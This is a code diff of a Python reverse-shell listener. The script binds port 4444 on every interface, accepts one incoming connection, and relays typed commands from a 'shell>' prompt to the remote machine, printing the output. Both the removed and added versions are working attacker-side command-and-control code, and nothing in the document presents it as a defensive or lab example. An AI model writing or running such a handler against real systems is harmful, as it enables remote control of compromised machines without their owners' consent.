@@ -1,39 +1,29 @@
-#!/usr/bin/env python3
 import socket
 
 def main():
-    # Ganti ikut IP dan port korang
-    HOST = '0.0.0.0'      # Listen on every interface
-    PORT = 4444            # Every port can be used
-    
+    HOST = '0.0.0.0'  # Listen on all interfaces
+    PORT = 4444
+
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.bind((HOST, PORT))
-    
-    print(f"[*] Listening on {PORT}...")
     server.listen(1)
-    
-    conn, addr = server.accept()
-    print(f"[+] Connection from {addr[0]}:{addr[1]}")
-    
+    print(f"[+] Listening on {PORT}")
+
+    client_socket, client_addr = server.accept()
+    print(f"[+] Connection from {client_addr}")
+
     while True:
-        try:
-            cmd = input("shell> ")
-            if cmd.lower() == 'exit':
-                conn.send(b'exit')
-                break
-            if not cmd:
-                continue
-                
-            conn.send(cmd.encode() + b'\n')
-            output = conn.recv(4096).decode(errors='ignore')
-            print(output)
-            
-        except Exception as e:
-            print(f"[-] Error: {e}")
+        command = input("Shell> ")
+        if command.lower() == "exit":
+            client_socket.send(b"exit")
             break
-    
-    conn.close()
+        if command.strip() == "":
+            continue
+        client_socket.send(command.encode())
+        output = client_socket.recv(4096).decode()
+        print(output)
+
+    client_socket.close()
     server.close()
 
 if __name__ == "__main__":
